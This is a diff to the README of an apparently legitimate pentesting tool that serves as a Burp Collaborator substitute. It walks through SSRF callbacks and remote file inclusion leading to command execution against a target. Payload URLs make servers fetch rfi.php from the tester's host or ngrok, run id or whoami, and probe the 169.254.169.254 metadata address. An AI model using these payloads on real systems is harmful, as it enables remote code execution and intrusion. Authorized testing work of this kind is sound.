@@ -1,62 +1,299 @@
-## 🌐 Burp Collaborator in python
+# 🔥 python-burp-collaborator
 
-if you're using **Burp Suite Community Edition** (which does not include Burp Collaborator), you can use this tool as a **replacement for both internal and external testing**.
+A lightweight, single-file Python tool that works as a **Burp Collaborator alternative** for both **internal and external SSRF/RFI testing**.
 
-### 🔓 To Use Externally
+It provides:
 
-You need to expose your local server to the internet.
+* SSRF callback detection
+* RFI → RCE payload hosting
+* Multi-language payload support
+* Clean proof-of-concept logging
 
-#### Option 1 — Using ngrok (Recommended)
+> 💡 If you're using **Burp Suite Community Edition** (no built-in collaborator), this tool can act as your **own collaborator server**.
 
-1. Start the tool:
+---
 
-```bash
+# ⚠️ Disclaimer
+
+Use this tool **only in authorized environments**.
+
+---
+
+# 🚀 Features
+
+* SSRF listener with token tracking
+* Multi-payload RFI server (`.php`, `.asp`, `.aspx`, `.jsp`, `.txt`)
+* Cross-platform command execution (Linux + Windows)
+* Works:
+
+  * Internal network ✔
+  * External testing ✔ (via ngrok)
+
+---
+
+# 🛠 Requirements
+
+* Python 3
+* (Optional) ngrok for external testing
+
+---
+
+# ▶️ Usage
+
+---
+
+# 🧪 🔹 INTERNAL TESTING (Same Network / VPN)
+
+## Step 1 — Find Your IP
+
+```bash id="3o6n9g"
+ipconfig     # Windows
+ifconfig     # Linux
+```
+
+Example:
+
+```
+192.168.1.50
+```
+
+---
+
+## Step 2 — Run Tool
+
+```bash id="0j4z6z"
+python ssrf_rfi_tool.py --ip 192.168.1.50
+```
+
+---
+
+## Step 3 — Use Payloads
+
+### SSRF
+
+```
+http://target/api?url=http://192.168.1.50:8000/<TOKEN>
+```
+
+---
+
+### RFI Detection
+
+```
+http://target/page.php?file=http://192.168.1.50:9000/rfi.txt
+```
+
+---
+
+### 🔥 RFI → RCE
+
+Linux:
+
+```
+http://target/page.php?file=http://192.168.1.50:9000/rfi.php&cmd=id
+```
+
+Windows:
+
+```
+http://target/page.php?file=http://192.168.1.50:9000/rfi.php&cmd=whoami
+```
+
+---
+
+## ✅ Expected Output
+
+```
+START
+uid=33(www-data)
+END
+```
+
+---
+
+# 🌐 🔹 EXTERNAL TESTING (Internet Targets)
+
+## ⚠️ Important
+
+Your local IP (192.168.x.x) is **NOT reachable from internet targets**.
+
+You MUST expose your tool.
+
+---
+
+## Step 1 — Run Tool Locally
+
+```bash id="c91d2c"
 python ssrf_rfi_tool.py --ip 127.0.0.1
 ```
 
-2. Expose ports:
+---
 
-```bash
+## Step 2 — Start ngrok
+
+Run **2 tunnels**:
+
+```bash id="xtj5ra"
 ngrok http 8000
 ngrok http 9000
 ```
 
-3. Use the generated public URLs:
+---
+
+## Step 3 — Get Public URLs
+
+Example:
 
 ```
-https://xxxx.ngrok.io/<TOKEN>
-https://xxxx.ngrok.io/rfi.php
+https://abc123.ngrok.io   → SSRF
+https://xyz456.ngrok.io   → RFI
 ```
 
 ---
 
-### 🔁 Replace Internal IP with Public URL
+## Step 4 — Use Payloads
 
-Instead of:
-
-```
-http://192.168.1.50:8000/<TOKEN>
-```
-
-Use:
+### SSRF
 
 ```
-https://your-ngrok-url/<TOKEN>
+http://target/api?url=https://abc123.ngrok.io/<TOKEN>
 ```
 
 ---
 
-### ⚠️ Important Notes
+### RFI Detection
 
-* SSRF requires the target server to reach your exposed URL
-* Some targets block HTTP → try HTTPS (ngrok helps here)
-* Use separate tunnels for ports 8000 and 9000 if needed
+```
+http://target/page.php?file=https://xyz456.ngrok.io/rfi.txt
+```
 
 ---
 
-### 💡 Pro Tip
+### 🔥 RFI → RCE
 
-If your payload works internally but not externally:
+Linux:
 
-* Target likely restricts outbound traffic
-* Use **internal pivoting instead of ngrok**
+```
+http://target/page.php?file=https://xyz456.ngrok.io/rfi.php&cmd=id
+```
+
+Windows:
+
+```
+http://target/page.php?file=https://xyz456.ngrok.io/rfi.php&cmd=whoami
+```
+
+---
+
+## ✅ SSRF Proof
+
+```
+[🔥 SSRF CALLBACK RECEIVED]
+Source: <TARGET_SERVER_IP>
+```
+
+---
+
+# 🔁 Internal → External Mapping
+
+| Internal                 | External             |
+| ------------------------ | -------------------- |
+| http://192.168.1.50:8000 | https://abc.ngrok.io |
+| http://192.168.1.50:9000 | https://xyz.ngrok.io |
+
+---
+
+# 🧠 Testing Strategy
+
+1. Start with `.txt` → confirm inclusion
+2. Try `.php` → attempt RCE
+3. Rotate extensions
+4. Execute commands
+5. Capture output
+
+---
+
+# ⚠️ Common Mistakes
+
+### ❌ Using internal IP externally
+
+Will NOT work.
+
+---
+
+### ❌ Not exposing both ports
+
+You need:
+
+* 8000 → SSRF
+* 9000 → RFI
+
+---
+
+### ❌ Assuming not vulnerable
+
+If external fails:
+
+* outbound traffic may be blocked
+* test internally or pivot
+
+---
+
+# 💣 Limitations
+
+* No DNS-based SSRF detection
+* No HTTPS server (ngrok solves this)
+* No WAF bypass automation
+
+---
+
+# 🧠 Pro Tips
+
+* Use pivot hosts for internal SSRF
+* Try:
+
+```
+169.254.169.254
+127.0.0.1
+10.x.x.x
+```
+
+* Always prove **RCE**, not just inclusion
+
+---
+
+# 📄 Example Finding
+
+**Vulnerability:** RFI → RCE
+
+**Proof:**
+
+```
+http://target/page.php?file=https://attacker/rfi.php&cmd=id
+```
+
+---
+
+# 🛑 Final Note
+
+If you're only seeing:
+
+```
+RFI_TEST_SUCCESS
+```
+
+👉 That’s detection only.
+
+If you see:
+
+```
+uid=www-data
+```
+
+👉 That’s impact.
+
+---
+
+# 👨‍💻 Author
+
+Built for real-world **pentesting & red team workflows**.
